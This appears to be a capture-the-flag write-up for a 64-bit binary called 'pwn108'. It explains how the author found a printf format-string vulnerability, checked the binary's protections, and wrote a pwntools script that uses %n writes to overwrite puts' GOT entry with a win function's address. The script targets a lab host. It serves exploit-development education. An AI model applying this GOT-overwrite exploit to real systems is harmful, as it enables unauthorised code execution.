```
pwn108-1644300489260.pwn108: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b1c32d1f20d6d8017146d21dfcfc4da79a8762d8, for GNU/Linux 3.2.0, not stripped
```

use radare2, ida to read assembly and pseudocode code of this binary<br> 

<img width="1373" height="368" alt="image" src="https://github.com/user-attachments/assets/838c6926-937f-40f2-ab37-4abd7e34a02c" />

we can see this is printf vulnarability<br>
use radare2 to set some breakpoints on this binary<br> 

then we use this input to leak data, find the parameter order of input 

<img width="2454" height="283" alt="image" src="https://github.com/user-attachments/assets/0a8703ee-b098-4bbd-8f35-82945752d428" />

then we see our input (ABCD...) at the 10th parameter<br><br>

The GOT (Global Offset Table) serves as a data repository for the memory addresses of shared library symbols<br>
The PLT (Procedure Linkage Table) acts as a trampoline that allows the binary to resolve and jump to those addresses at runtime<br><br> 

```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

it's no PIE, and 

<img width="747" height="782" alt="image" src="https://github.com/user-attachments/assets/87143a4a-883d-48c4-892d-20477fad1132" />

got, got.plt can be read, written<br> combining with string format vulnarability, we can rewrite a called function to expecting function<br> 
the expecting function is<br>
<img width="1106" height="462" alt="image" src="https://github.com/user-attachments/assets/b57d5436-bf0d-4684-bd7a-e6f426c38835" />

the address of this function is 0x000000000040123B

specifier format `%n` can have we write anything at anywhere, we will choose the puts function to rewrite the value at its address 

```
'''
input = $11
'''

from pwn import * 

context.binary = binary = ELF("./pwn108-1644300489260.pwn108")

got_puts_address = binary.got.puts 

jump_payload = b'A' * 0x12 

left_bytes = 16 - (len(p64(got_puts_address + 2)) + len(p64(got_puts_address))) % 16 

'''
note that it's 64 bit architecture
'''
payload = b'%64X%13$n' + b'%4603X%14$hnAAA' + p64(got_puts_address + 2) + p64(got_puts_address) 

# p = process() 

p = remote("10.49.128.150", 9008)

p.send(jump_payload)
# p.recv() 
p.send(payload)
p.interactive() 
```



